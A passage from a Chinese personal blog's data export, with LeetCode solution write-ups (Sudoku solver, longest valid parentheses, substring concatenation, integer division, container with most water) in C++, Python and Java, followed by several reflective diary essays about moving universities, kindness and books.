col[y][i] = grid[k][i] = false; &#125; return false; &#125; public: void solveSudoku(vector&lt;vector&lt;char&gt;&gt;&amp; board) &#123; bool row[9][9] = &#123;false&#125;, col[9][9] = &#123;false&#125;, grid[9][9] = &#123;false&#125;; for(int i = 0; i &lt; 9; ++i)&#123; for(int j = 0; j &lt; 9; ++j)&#123; if(board[i][j] == &#x27;.&#x27;) continue; int t = board[i][j] - &#x27;1&#x27;, k = i / 3 * 3 + j / 3; row[i][t] = col[j][t] = grid[k][t] = true; &#125; &#125; dfs(0, board, row, col, grid); &#125;&#125;; Python 1234567891011121314151617181920212223242526272829303132333435363738394041class Solution(object): def dfs(self, cur, board, vis_row, vis_col, vis_sub_box): if cur == 81: return True x, y = cur // 9, cur % 9 if board[x][y] != &#x27;.&#x27;: return self.dfs(cur + 1, board, vis_row, vis_col, vis_sub_box) for k in range(9): sub_index = x // 3 * 3 + y // 3 if vis_row[x][k] or vis_col[y][k] or vis_sub_box[sub_index][k]: continue vis_row[x][k] = vis_col[y][k] = vis_sub_box[sub_index][k] = True board[x][y] = chr(k + ord(&#x27;1&#x27;)) if self.dfs(cur + 1, board, vis_row, vis_col, vis_sub_box): return True board[x][y] = &#x27;.&#x27; vis_row[x][k] = vis_col[y][k] = vis_sub_box[sub_index][k] = False return False def solveSudoku(self, board): &quot;&quot;&quot; :type board: List[List[str]] :rtype: void Do not return anything, modify board in-place instead. &quot;&quot;&quot; vis_row = [[False] * 9 for _ in range(9)] vis_col = [[False] * 9 for _ in range(9)] vis_sub_box = [[False] * 9 for _ in range(9)] for i in range(9): for j in range(9): if board[i][j] == &#x27;.&#x27;: continue k = ord(board[i][j]) - ord(&#x27;1&#x27;) sub_index = i // 3 * 3 + j // 3 vis_row[i][k] = vis_col[j][k] = vis_sub_box[sub_index][k] = True self.dfs(0, board, vis_row, vis_col, vis_sub_box) 本文是leetcode如下的题解 36. Valid Sudoku 37. Sudoku Solver 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode 32 Longest Valid Parentheses","slug":"leetcode-longest-valid-parentheses","date":"2015-02-06T03:40:27.000Z","updated":"2021-01-08T13:32:16.854Z","comments":true,"path":"leetcode-longest-valid-parentheses/","link":"","permalink":"https://www.hrwhisper.me/leetcode-longest-valid-parentheses/","excerpt":"Given a string containing just the characters '(' and ')', find the length of the longest valid (well-formed) parentheses substring. Example 1: Input: \"(()\" Output: 2 Explanation: The longest valid parentheses substring is \"()\" Example 2: Input: \")()())\" Output: 4 Explanation: The longest valid parentheses substring is \"()()\"","text":"Given a string containing just the characters '(' and ')', find the length of the longest valid (well-formed) parentheses substring. Example 1: Input: \"(()\" Output: 2 Explanation: The longest valid parentheses substring is \"()\" Example 2: Input: \")()())\" Output: 4 Explanation: The longest valid parentheses substring is \"()()\" 题目地址：leetcode Longest Valid Parentheses 题目大意：给你一个括号组成的字符串，要求求出最长的合法括号长度 一开始想，每次计算的时候用当前右括号，合法长度的开头，但是有 )(((((()())()()))()(()))( 应该为22. 而我合法长度的开头从1开始，因为后面没有匹配第一个和第二个左括号的，所以wa了。 后来开了个数组Match，用来标记当前左括号和哪个右括号匹配。 之后进行一次扫描，过程主要如下： 用temp标记合法连续的上一块总长度 若match[i]!=0, 每次i移动的位置直接移动到右括号的位置（即match[i])，因为这一段必定是合法的。 更新ans 1234567891011121314151617181920212223242526272829303132333435class Solution &#123;public: int longestValidParentheses(string s) &#123; stack&lt;int&gt; q; int len = s.length(); int *match = new int[len]; for (int i = 0; i &lt; len; i++)&#123; match[i] = 0; if (s[i] == &#x27;)&#x27; &amp;&amp; !q.empty())&#123; match[q.top()] = i; q.pop(); &#125; else if (s[i] == &#x27;(&#x27;) q.push(i); &#125; int temp = 0, ans = 0; for (int i = 0; i &lt; len; i++)&#123; if (!match[i]) continue; if (temp + match[i] - i + 1&gt; ans) ans = temp + match[i] - i + 1; if ( match[i] + 1 &lt; len &amp;&amp; match[ match[i] + 1] == 0) temp = 0; else temp = temp + match[i] - i + 1; i = match[i]; &#125; delete[] match; return ans; &#125;&#125;; 之后搜了别人怎么做的。 有的直接用个bool数组标记括号是否匹配，如果匹配为1，之后进行统计即可。 更简单一些。 参考代码如下： c++: 12345678910111213141516171819202122232425262728class Solution &#123;public: int longestValidParentheses(string s) &#123; stack&lt;int&gt; q; int len = s.length(); bool *match = new bool[len]; for (int i = 0; i &lt; len; i++)&#123; match[i] = 0; if (s[i] == &#x27;)&#x27; &amp;&amp; !q.empty())&#123; match[q.top()] = match[i]=true; q.pop(); &#125; else if (s[i] == &#x27;(&#x27;) q.push(i); &#125; int temp = 0, ans = 0; for (int i = 0; i &lt; len; i++)&#123; if (!match[i]) &#123; temp = 0; continue; &#125; temp++; ans = ans &lt; temp ? temp : ans; &#125; delete[] match; return ans; &#125;&#125;; Python 123456789101112131415161718192021class Solution: # @param s, a string # @return an integer def longestValidParentheses(self, s): stack=[] match=[0 for i in range(0,len(s))] for i,c in enumerate(s): if c == &#x27;(&#x27;: stack.append(i) elif c==&#x27;)&#x27; and len(stack)!=0: match[i]=match[stack[-1]]=1 stack.pop() ans ,temp=0,0 for i,c in enumerate(match): if match[i]: temp=temp+1 ans= max(ans,temp) else: temp=0 return ans 还可以用栈记录上一个括号的位置和之前连续的长度。 若能和上一段拼接起来，就合并。合并比(())()这种情况，最后一个)的时候，发现可以和之前的合并。 12345678910111213141516171819202122232425262728class Solution &#123;public: int longestValidParentheses(string s) &#123; int ans = 0, cur = 0; stack&lt;pair&lt;int, int&gt;&gt; q; for (int i = 0; i &lt; s.size(); ++i) &#123; if (s[i] == &#x27;)&#x27;) &#123; if (q.empty()) cur = 0; else &#123; pair&lt;int, int&gt; t = q.top(); cur += t.second + 2; q.pop(); if (!q.empty() &amp;&amp; q.top().first == i - cur + 1) &#123; cur += q.top().second; q.pop(); &#125; ans = max(ans, cur); &#125; &#125; else &#123; q.push(make_pair(i,cur)); cur = 0; &#125; &#125; return ans; &#125;&#125;; 下面是最简洁的写法了， 遇到(就把下标放入， 遇到)就先pop一个， 如果栈为空，说明没匹配，把当前下标push进去，作为新的一段的开始 栈不为空，说明合法，长度为i - 栈顶的下标 123456789101112131415161718192021class Solution &#123;public: int longestValidParentheses(string s) &#123; int ans = 0, cur = 0; stack&lt;int&gt; q; q.push(-1); for (int i = 0; i &lt; s.size(); ++i) &#123; if (s[i] == &#x27;)&#x27;) &#123; q.pop(); if (q.empty()) q.push(i); else ans = max(ans, i - q.top()); &#125; else &#123; q.push(i); &#125; &#125; return ans; &#125;&#125;;","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode 30 Substring with Concatenation of All Words","slug":"leetcode-substring-with-concatenation-of-all-words","date":"2015-02-04T11:26:43.000Z","updated":"2021-01-08T13:32:16.870Z","comments":true,"path":"leetcode-substring-with-concatenation-of-all-words/","link":"","permalink":"https://www.hrwhisper.me/leetcode-substring-with-concatenation-of-all-words/","excerpt":"You are given a string, S, and a list of words, L, that are all of the same length. Find all starting indices of substring(s) in S that is a concatenation of each word in L exactly once and without any intervening characters. For example, given: S: \"barfoothefoobarman\" L: [\"foo\", \"bar\"] You should return the indices: [0,9]. (order does not matter).","text":"You are given a string, S, and a list of words, L, that are all of the same length. Find all starting indices of substring(s) in S that is a concatenation of each word in L exactly once and without any intervening characters. For example, given: S: \"barfoothefoobarman\" L: [\"foo\", \"bar\"] You should return the indices: [0,9]. (order does not matter). 题目地址：leetcode Substring with Concatenation of All Words 题目大意：给定一些单词words(可能重复，长度相同）和一个长字符串s，要求求出长字符串的所有起始位置，使得给定的所有单词在之后出现一次且仅一次 思路： 方法一 首先用对words中每个单词进行计数count_word(hash表)， 枚举起始位置和终点位置，每次用cur_cnt计数，若单词存在且cur_cnt[word] &lt;= count_word[word]，总计数total_in+1, 如果rotal_in等于words的长度，放入答案ans 复杂度O(len(s) * len(words) * t)， t为计算每个单词hash值的时间。 C++ 125ms 123456789101112131415161718192021222324252627class Solution &#123;public: vector&lt;int&gt; findSubstring(string s, vector&lt;string&gt;&amp; words) &#123; vector&lt;int&gt; ans; if (s.empty() || words.empty()) return ans; int word_len = words[0].size(); int n = words.size(); unordered_map&lt;string, int&gt; count_word; for (const string &amp;word : words) ++count_word[word]; for (int i = 0; i + n * word_len &lt;= s.size(); ++i) &#123; int total_in = 0; unordered_map&lt;string, int&gt; cur_cnt; for (int j = i; j &lt; i + n * word_len; j += word_len) &#123; string word = s.substr(j, word_len); if (++cur_cnt[word] &gt; count_word[word]) break; ++total_in; &#125; if (total_in == n) ans.push_back(i); &#125; return ans; &#125;&#125;; Python 123456789101112131415161718192021222324252627282930class Solution: # @param S, a string # @param L, a list of string # @return a list of integer def findSubstring(self, S, L): ans=[] Dict = dict.fromkeys(L,0) for word in L: Dict[word]=Dict[word]+1 totWord = len(L) wordLen = len(L[0]) slen =len(S) - totWord * wordLen; for i in range(0,slen+1): cnt =dict.fromkeys(L,0) okNum=0 for k in range(0,totWord): cur=S[i+k*wordLen:i+(k+1)*wordLen] if(cur in Dict ): cnt[cur]=cnt[cur] + 1 if(cnt[cur] &gt; Dict[cur]): break okNum=okNum + 1 if(okNum==totWord): ans.append(i) return ans 方法二 我们可以用滑动窗口思想优化上面的过程。 设word_len为单词的长度，枚举可能的起点为[0, word_len]， 然后枚举s中的单词，令start = i表示当前窗口的起点，令j = i表示当前枚举的字符串s的起点，每次枚举结束j+= word_len 在枚举s中单词的过程中保持一个合法的窗口 使得cur_cnt[word] &lt;= count_word[word]，若窗口不合法，则说明之前已经有单词存在，不断的令start对应的单词-=1，start+=word_len即可。 复杂度O(word_len * len(s) / word_len * 2)= O(len(s) * 2)，乘上2是因为一次遍历中，每个单词最多两次。（PS：这个复杂度没有计算哈希的代价，假设为O(1）) C++ 1234567891011121314151617181920212223242526272829303132333435363738class Solution &#123;public: vector&lt;int&gt; findSubstring(string s, vector&lt;string&gt;&amp; words) &#123; vector&lt;int&gt; ans; if (s.empty() || words.empty()) return ans; int word_len = words[0].size(); unordered_map&lt;string, int&gt; count_word; for (const string &amp;word : words) ++count_word[word]; for (int i = 0; i &lt; word_len; ++i) &#123; int total_in = 0; unordered_map&lt;string, int&gt; cur_cnt; for (int j = i, start = i; j + word_len &lt;= s.size(); j += word_len) &#123; string word = s.substr(j, word_len); if (count_word.find(word) == count_word.end()) &#123; cur_cnt.clear(); total_in = 0; start = j + word_len; &#125; else &#123; ++cur_cnt[word]; while (cur_cnt[word] &gt; count_word[word]) &#123; --cur_cnt[s.substr(start, word_len)]; start += word_len; --total_in; &#125; if (++total_in == words.size()) &#123; ans.push_back(start); &#125; &#125; &#125; &#125; return ans; &#125;&#125;; Python 1234567891011121314151617181920212223242526272829class Solution(object): def findSubstring(self, s, words): &quot;&quot;&quot; :type s: str :type words: List[str] :rtype: List[int] &quot;&quot;&quot; if not s or not words: return [] word_len = len(words[0]) word_total = (len(words) - 1) * word_len ans = [] word_cnt = collections.Counter(words) for i in range(word_len): start = i cur_cnt = collections.Counter() for j in range(i, len(s) - word_len + 1, word_len): word = s[j: j + word_len] if word in word_cnt: cur_cnt[word] += 1 while cur_cnt[word] &gt; word_cnt[word]: cur_cnt[s[start: start + word_len]] -= 1 start += word_len else: cur_cnt.clear() start = j + word_len if(start + word_total == j): ans.append(start) return ans 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode 29 Divide Two Integers","slug":"leetcode-divide-two-integers","date":"2015-02-03T13:10:50.000Z","updated":"2021-01-08T13:32:16.838Z","comments":true,"path":"leetcode-divide-two-integers/","link":"","permalink":"https://www.hrwhisper.me/leetcode-divide-two-integers/","excerpt":"Divide two integers without using multiplication, division and mod operator. If it is overflow, return MAX_INT.","text":"Divide two integers without using multiplication, division and mod operator. If it is overflow, return MAX_INT. 题目地址：leetcode Divide Two Integers 题目大意： 给两个数，要求实现除法运算，但是不能用乘法、除法和模运算。 思路 用除数每次*2（向左移动一位）去逼近被除数，被除数减去新的除数如此循环。 详见代码。 需要注意的是溢出需要返回int_max ，还有防止移位运算溢出需要用long long C++ 1234567891011121314151617181920212223class Solution &#123; long long bit_divide(long long &amp;dividend, long long divisor) &#123; long long res = 1; for (; (divisor &lt;&lt; 1) &lt;= dividend; res &lt;&lt;= 1, divisor &lt;&lt;= 1) ; dividend -= divisor; return res; &#125;public: int divide(int dividend, int divisor) &#123; long long dividend_l = labs(dividend), divisor_l = labs(divisor); int flag = (dividend &lt; 0) ^ (divisor &lt; 0); long long ans = 0; while (divisor_l &lt;= dividend_l) &#123; ans += bit_divide(dividend_l, divisor_l); if (ans &gt;= INT_MAX) &#123; if (flag &amp;&amp; -ans == INT_MIN) return INT_MIN; return INT_MAX; &#125; &#125; return flag? -ans : ans; &#125;&#125;; Python 1234567891011121314151617181920212223class Solution(object): def divide(self, dividend, divisor): &quot;&quot;&quot; :type dividend: int :type divisor: int :rtype: int &quot;&quot;&quot; flag = (dividend &lt; 0) ^ (divisor &lt; 0) dividend, divisor = abs(dividend), abs(divisor) ans = 0 while divisor &lt;= dividend: temp = 1 div = divisor while (div &lt;&lt; 1) &lt;= dividend: div &lt;&lt;= 1 temp &lt;&lt;= 1 dividend -= div ans += temp if ans &gt;= 0x7fffffff: if flag and ans == 0x80000000: return -0x80000000 return 0x7fffffff return ans if not flag else -ans 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode 11 Container With Most Water","slug":"leetcode-container-with-most-water","date":"2015-02-02T08:55:21.000Z","updated":"2021-01-08T13:32:16.829Z","comments":true,"path":"leetcode-container-with-most-water/","link":"","permalink":"https://www.hrwhisper.me/leetcode-container-with-most-water/","excerpt":"Given n non-negative integers a1, a2, ..., an, where each represents a point at coordinate (i, ai). n vertical lines are drawn such that the two endpoints of line i is at (i, ai) and (i, 0). Find two lines, which together with x-axis forms a container, such that the container contains the most water. Note: You may not slant the container.","text":"Given n non-negative integers a1, a2, ..., an, where each represents a point at coordinate (i, ai). n vertical lines are drawn such that the two endpoints of line i is at (i, ai) and (i, 0). Find two lines, which together with x-axis forms a container, such that the container contains the most water. Note: You may not slant the container. 题目地址：leetcode Container With Most Water 题目大意： 给定n个数a1~an，代表垂直x轴的线的高度。求任意两条线之间所能装水的最大容积。容积的计算方式为 min(ai,aj) * (j - i) , i &lt; j 思路： 简单的做法是直接枚举起点i和终点j，然后计算一次min(ai,aj) * (j - i)，取最大，这样复杂度O(n^2) 更好的做法是双指针，这样可以达到O(n). 一开始l和r分别指向首尾，即l = 0, r = len(a) - 1, 然后计算容积。 接着若a[l] &lt; a[r] 则 l++ 否则 r-- 为啥是对的？ 看看公式min(ai,aj) * (j - i) , 若 a[l] &lt; a[r]，只能通过增加二者中较小的a[l]来增加面积，因为j - i已经是目前能达到的最大值了。 C++ 12345678910111213class Solution &#123;public: int maxArea(vector&lt;int&gt;&amp; height) &#123; int ans = 0; for(int i = 0, j = height.size() - 1; i &lt; j;)&#123; if(height[i] &lt; height[j]) ans = max((j - i) * height[i++], ans); else ans = max((j - i) * height[j--], ans); &#125; return ans; &#125;&#125;; Java 12345678910111213class Solution &#123; public int maxArea(int[] height) &#123; int ans = 0; for (int l = 0, r = height.length - 1; l &lt; r; ) &#123; ans = Math.max(ans, (r - l) * Math.min(height[l], height[r])); if (height[l] &lt; height[r]) l++; else r--; &#125; return ans; &#125;&#125; Python 123456789101112131415class Solution(object): def maxArea(self, height): &quot;&quot;&quot; :type height: List[int] :rtype: int &quot;&quot;&quot; ans = l = 0 r = len(height) - 1 while l &lt; r: ans = max(ans, (r - l) * min(height[l], height[r])) if height[l] &lt; height[r]: l += 1 else: r -= 1 return ans 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"一纸闲愁12 一些矫情的话","slug":"emotion-at-a-paper-12","date":"2014-12-13T15:49:27.000Z","updated":"2020-10-19T14:35:48.728Z","comments":true,"path":"emotion-at-a-paper-12/","link":"","permalink":"https://www.hrwhisper.me/emotion-at-a-paper-12/","excerpt":"长大不过一夜之间。","text":"长大不过一夜之间。 起床，出门。 打开手机看着天气预报，. 早已司空见惯，负几到正几一点之隔。 早已习以为常，气温在零上零下摇摆。 天气好时，出门吃饭，总能看到日出。 不禁深深叹息： 日出不该是那么廉价的东西， 日出应该只属于早起的人。 七点多的时光，还能看见火红的太阳。 天亮得好晚。 最近比较关注足球。 当初认识C罗，是因为一句话”你最好全神贯注，因为我定会全力以赴“ 不过现在，“进球靠跳水“（假摔） 也许吧，我没深究。 不管怎么说踢球需要球品。而人，也需要人品。 所以我赞赏上次那个学姐，因为真诚。 今天去图书馆的路上，遇到了在路旁的麻雀。 RUC的麻雀，真多。 但他们的世界，会只局限于这么小小的一块校园么? 如果是，那未免太小。 想着想着，愚蠢的选了个插座被人占用的座位。- - 那就直接用电池吧。本本。 打水回来，对面的那个漂亮妹纸回来了（之前不在）她说： 你要是电池没电可以用我的 .善良的女孩纸。 一次她去上厕所，还问我电够不够，我说，够够够~要是不够在叫你。 之后又问了一次。 正如书中说的那样， 善良是一种天赋，而善意是一种选择。 人性固然本善，但是人总有太多的借口，为自己不行善找各种各样的理由。 面对一个陌生的人，能自然而然的关心别人的困难，真是善良。 现在我坐在她的对面，写下这几句话，瞄了她一眼，笑了笑。她好奇的看过来，可能是奇怪在笑啥。也可能是因为帮助了别人发自内心的微笑。 我见了许许多多的女孩纸，有的幼稚，有的成熟，有的任性，而有的优雅。干净整洁的女孩纸，怎么样都不会太难看，心怀善良的女孩纸，更让人疼惜。 我的心是一座小屋，那里珍藏着我 认为美丽的东西。不是谁都可以进来。 男人需要的是风度，一种大度。你伤害过我，我笑笑，不予计较。 女人需要的是优雅。不是盯着鸡毛蒜皮的小时斤斤计较，懂得去做该做的事，用正确的方式。 如今，已经不再刷微博。偶尔看看小伙伴动态。 当今的人们总是懒得付出和交流，却只热衷引领和表达。 无数所谓的心灵鸡汤，我只觉得看多了会反胃—— 真正做到知行合一的人有多少？ 所以，这就是为什么，“听了好多道理，却依然过不好这一生”。 同时，还有一些所谓的”经典“的语言，误导着广大群众的价值观。 比如“有钱就是任性“，好像这样是很值得夸耀的一件事情。 比如再见再也不见，曲解了再见的含义。让我一直误解。 再比如昨天看的匆匆那年：“我们要互相亏，如果过去还值得缅怀，别太快冰释前嫌” 作词者:梁伟文。 我讨厌这一首歌的词。说白了就是说让人不要去做，大有缺憾才是美的意思。 我想喷死他，这是懒惰者的自我安慰的借口而已。 该做的不去做，然后在余生中后悔不迭？什么心态。 不让自己留遗憾，该做的去做，哪怕世事岂能皆如愿，那也无愧于我心。 借用鸣人的话来说，就是：这就是我的忍道。 有时候，会渴望让人收藏，细心呵护，免我四下流离，免我无枝可依。但我是男孩子。大丈夫顶天立地，应该独立，而不是依靠他人。不是么？就像女孩纸的安全感不能指望他人一样。 说起安全感，同来的几个女孩纸说和我出去玩很有安全感。而上个月有个女孩遇到了一些事情，然后指责我说“你以前和我说什么安全感都是自己找的，什么鬼话。她就是因为没有安全感才离开你。”还举了某一天所谓的她微博说和学弟喝奶茶聊天很开心为的是刺激我，因为我不在乎。我听了就笑了。能成熟点么？抛开我是否在乎不说，安全感寄托在旁人身上，迟早要失望。那些口口声声说自己是女汉纸的女孩，你们敢成为女强人么？女汉纸只是逞强，为自己疯疯癫癫的行为找借口而已。而女强人，才是真强。至于我在不在乎，苍天可鉴，我，不予评价。 去玩。 某公交站牌旁边的地图上。 你彷徨站着，就好像个迷路的孩子。 望着硕大的北京城，一条条马路好像毛细血管。密密麻麻。 而你，举目无亲。 还记得上次离别是什么时候吗？ 那一夜，是你还是他，独上高楼，望尽天涯路。 古人说：“日暮酒醒人已远，满天风雨下西楼” 古人说“从此无心爱良夜，任他明月下西楼。” 古人说“说无言独上西楼。” 还说“雁字回时，月满西楼。” 古人说的不是西楼，是离愁。 一种相思，两处闲愁，你，还在想他吗？ 同行的女生说，将来要嫁晋江的，那是她的故乡。 问我将来呆不呆在晋江。 晋江太小，不是么？ 姑娘，我何德何能， 让你想托付终身。 大冰在《他们最幸福》中写道： “ 不管是欠别人，还是欠自己，你曾欠下过多少个“对不起”？ 时间无情第一，它才不在乎你是否还是一个孩子，你只要稍一耽搁、稍一犹豫，它立马帮你决定故事的结局。 它会把你欠下的对不起，变成还不起。 又会把很多对不起，变成来不及。” “难过时，她是唯一一个懂得如何宽慰我的女性朋友，我难过时喜欢沉默，她就在电话那头陪着我沉默，隔着千山万水地陪我沉默。\"（我难过时也喜欢沉默。多渴望也有一个这样的朋友。陪着你千山万水的沉默。有时候无言，却是最好的安慰。） “那什么是成功？” “在当下，这个词是最速效的洗脑工具，是最广谱的精神鸦片，可以是好车子、大房子、高年薪这么简单，也可以解读为体面的受人尊敬的生活。 “你敢说你不是个实用主义者吗？你能否认最深入人心的标准不是金钱、权利、名望吗？你真心认可这种标杆吗？我只是觉得如果一个人还算年轻，当他面对生活时，只会盲从想追求‘成功’，那于灵魂而言，他的人生是绚丽的，还是贫瘠的？” …… 大冰的书中，（《他们最幸福》、《乖，摸摸头》）谈起了许许多多人的故事。那是和我认知不一样的世界。 原来，还有人这样活；原来，生活洒脱就好。 我觉得最重要的，是有一个即使你你颠沛流离也同样不离不弃的人。 所以我羡慕。遇到了那个她的那些人。 我相信，世界上有许许多多的人用同样的方式生活，有梦为马，随处可栖。 而他们，最幸福。 现在，我回来了，那个自信微笑的自己，那个充满干劲的自己，而不是整天浑浑噩噩的我。 从现在起，我做我该做的事情，做自己想做的事情，按自己步调，一步一脚印，直到天涯海角，直到地老天荒。也许会摔倒，会犯错，而且还不只一次，但深知“疼痛总比苍白好，总比遗憾好，总比无病呻吟的平淡是真要好的多的多。”那么前行吧。也许有一天，你身旁多了一个身影；也许某一天，梦想无边的海滩，有两双脚印结伴而过的痕迹。 —THE END- 2014.12.10~2014.12.14","categories":[{"name":"whisper","slug":"whisper","permalink":"https://www.hrwhisper.me/categories/whisper/"},{"name":"一纸闲愁","slug":"whisper/一纸闲愁","permalink":"https://www.hrwhisper.me/categories/whisper/%E4%B8%80%E7%BA%B8%E9%97%B2%E6%84%81/"}],"tags":[{"name":"心情","slug":"心情","permalink":"https://www.hrwhisper.me/tags/%E5%BF%83%E6%83%85/"}]},{"title":"一纸闲愁11 几多轮回少一人","slug":"emotion-at-a-paper-11","date":"2014-11-30T16:11:44.000Z","updated":"2020-10-19T14:35:48.728Z","comments":true,"path":"emotion-at-a-paper-11/","link":"","permalink":"https://www.hrwhisper.me/emotion-at-a-paper-11/","excerpt":"一纸闲愁11写于去RUC前。","text":"一纸闲愁11写于去RUC前。 BGM：天空之城悄悄的，悄悄的， 今天就走。 一如我两年前轻轻的来。 上天和我开了一个小小的玩笑， 不过是想让你，来完成未了 的缘。 我在大学里，没有遗憾。 尽力做自己想做的事情，所以无愧于心。 剩下一件心愿未了的事情，我会尽量带去RUC完成。（wp for fzu helper) 和嘉雯老师说不要太想我0 0 默默上完最后一节课。 去KTV Eason专场。 给许多小伙伴送奶茶。 （没送到的不要伤心哈！有心无力） …… “其实，我们这些人都是你生活的过客而已，你只要继续努力地把自己活得精彩就够了。作为朋友，咱也会一样为你开心，将来某一天，突然遇到，坐下来喝喝茶、聊聊过去和将来，很美好。” 哲哥的留言 `` 是，就算我不愿意承认，这是事实。 许许多多的人，也许就是一面之缘，带着我辨认不清的面孔。 许许多多的人，也许就是泛泛之交，带着那或深或浅的记忆。 你是谁—— 你会不会带着迷茫的眼神看着我， 你会不会突然眼睛一亮想起我是谁， 你会不会笑着说好久不见。 有什么，可以穿过时间的重量。 假如，这世间有所谓的永恒， 谁会在脑海中刻下你的笑？ 假如，世间没有所谓的永恒， 谁会在谁记忆里模糊了？ 假如你们的生命里不再有我的痕迹， 假如我不小心把你们忘记。 但是，生命里没有如果。 是明年今日，未见你一年，谁舍得改变。 还是遥远的她，热情若无变，哪管他沧桑变化， 或者，约定，两鬓斑白都可记得你。 我会记住所有温暖而美好的事情。 我，这么珍惜，生命里所有的偶然与遇见，我愿意幸福，也只愿意幸福。 PS：顺带前几天的书评。 【活着】 -余华 我想起昨天看完的《岛》 一个给一座绝望的岛，一个给 一座永远没有返还之路的岛。 一条渡船，便是移动的桥。 一个可怜的父亲， 给送去物资的人。 而他，也只能把妻子和女儿先后送上这个绝望的岛——因为麻风病。 上天是不是不忍，终于有一天，一个医生彻底根治了麻风病，她的女儿回来了。 然而，就在那天，也只有那天，他“生平唯一一次很高兴妻子不在场” 另一个女儿死于她丈夫枪下。 是造化弄人还是上帝的玩笑。 活着也是。 先，是福贵他父亲去了，然后是母亲、儿子、女儿、妻子、孙子…… 一个个，一个个。 只剩他了。 是不是，是不是他的名字，吸收了他所有的运气，所以就用一辈子来偿还？ 就像“用一辈子的眼泪来还他”的黛玉？ “人是为活着本身活着，而不是为活着之外的任何事物活着” 时光也让福贵老去。 他，依然在阳光下，笑着和一头牛耕种。 “人生天地间，忽如远行客“ 短短的人生，红尘陌上，谁也没有回程的幸运。 然而你不必叹息，在凡尘路上，我们都殊途同归。 无论王侯将相、富商巨甲，还是布衣草民，死神的镰刀，总是冰冷而干脆。 地球上，等待帝王和权势的，是死亡。 而百姓，则说，入土为安。 无论如何，生活请微笑的面对。 My way and My heart :)","categories":[{"name":"whisper","slug":"whisper","permalink":"https://www.hrwhisper.me/categories/whisper/"},{"name":"一纸闲愁","slug":"whisper/一纸闲愁","permalink":"https://www.hrwhisper.me/categories/whisper/%E4%B8%80%E7%BA%B8%E9%97%B2%E6%84%81/"}],"tags":[{"name":"心情","slug":"心情","permalink":"https://www.hrwhisper.me/tags/%E5%BF%83%E6%83%85/"}]},{"title":"一纸闲愁10 纵使青春留不住","slug":"emotion-at-a-paper-10","date":"2014-11-30T16:10:11.000Z","updated":"2020-10-19T14:35:48.728Z","comments":true,"path":"emotion-at-a-paper-10/","link":"","permalink":"https://www.hrwhisper.me/emotion-at-a-paper-10/","excerpt":"一纸闲愁10写于2014.6.25","text":"一纸闲愁10写于2014.6.25 每个人都会对人生中最重要的地方最重要的人一一告别，却无法预想告别方式。 ----------------题记 BGM：梁咏琪 - 还是那个你 我知道，曲终人散终究是要谢幕的，要走的，总是留不住的。 只是没有想到，要先走的，会是自己。 家的距离越来越远，终于要远到了在地图上，拉开食指与拇指丈量。 在那里，我可以遇到许许多多志同道合的人； 在那里，我可以去见识更大的世面； 在那里，可以体会不一样的氛围； 在那里，有人大女神（尼玛，这不是重点！） …… 我列举了数百个好处， 却始终无法摆脱那离别的愁绪。 落叶归根。 于是，打电话回家，想让父母挽留。 然而， “你去吧，爸爸支持你”。 我可以看出，短暂的沉默，爸爸是经过多少纠结犹豫才一个字一个字的吐出，经过电话，飘过时间与空间的距离，到达我的耳朵。 两年前，大概也是这个时候。 “东北大学” “太远” “……” 二十岁的我，比十八岁的我，究竟成熟了多少，让我父母去相信。 爸妈又经历了多少，终于不再束缚。 甘愿做桥梁。 是，我有成长。但这还不够。我还不够强大。 想起《那些让你痛苦的 必是让你成长的》的作者嘉倩，只身前去欧洲。一个二十岁脆弱又坚强的女孩。（她在欧洲做过交换生。） 而我算老几？ 这本书是在图书馆里偶然看见的。 也许命运真的有种冥冥的安排。 而我不信命。 我走了，一路向北。去一个完全陌生，无人认识的环境。 就如同两年前只身北上。 我将缺席你们生命中极为重要的一年。 导演说福大里，暂时没有了我戏份。 我不希望只剩下你们的照片，抚摸上冰冷的屏幕，把手伸去，触碰你，却永远差了一厘米。 我不希望自己只能趴在回忆的缝隙里看去，不敢惊扰。 我不希望自己会将那些生命中温暖而美好的事情忘记。 